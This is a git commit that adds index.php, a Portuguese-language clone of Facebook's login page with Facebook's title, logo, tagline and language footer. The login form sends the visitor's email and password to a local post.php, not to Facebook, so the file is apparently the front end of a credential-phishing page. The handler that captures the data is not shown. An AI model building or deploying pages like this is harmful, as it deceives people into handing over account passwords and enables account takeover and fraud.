da1251d7bb37fba3215238cf14b3f2c1d6e01e89
SystemRhino <80726377+SystemRhino@users.noreply.github.com>
2022-10-15 15:45:46 -0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Facebook</title>
+    <link rel="icon" href="./icon.png" />
+    <link rel="stylesheet" href="./style.css" />
+</head>
+<body>
+    <div class="container">
+        <div class="center">
+                        <section class="display-flex-center">
+                <hgroup>
+                    <img src="./dF5SId3UHWd.svg" alt="Facebook">
+                    <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que<br>fazem parte da sua vida.</p>
+                </hgroup>
+            </section>
+            <aside class="display-flex-center">
+                <div class="login">
+                    <form action="post.php" method="post">
+                        <input type="text" name="email" placeholder="Email ou telefone">
+                        <input type="password" name="senha" placeholder="Senha">
+                        <button id="entra">Entrar</button>
+                        <a href="#">Esqueceu a senha?</a>
+                        <div class="line"></div>
+                        <button id="create">Criar nova conta</button>
+                    </form>
+                    <p style="font-size:14px;"><a style="font-weight: 700; color: #1c1e21;" href="#">Criar uma pagina</a> para uma celebridade, uma marca ou uma empresa.</p>
+                </div>
+            </aside>
+        </div>
+        <footer>
+            <div class="center">
+                <div id="idiomas">
+                    <p>Português (Brasil)</p>
+                    <p>English (US)</p>
+                    <p>Español</p>
+                    <p>Français (France)</p>
+                    <p>Italiano</p>
+                    <p>Deutsch</p>
+                    <p>العربية</p>
+                    <p>हिन्दी</p>
+                    <p>中文(简体)</p>
+                    <p>日本語</p>
+                    <button>+</button>
+                </div>
+                <div style="margin: 10px; border-bottom: solid 1px #dadde1;"></div>
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
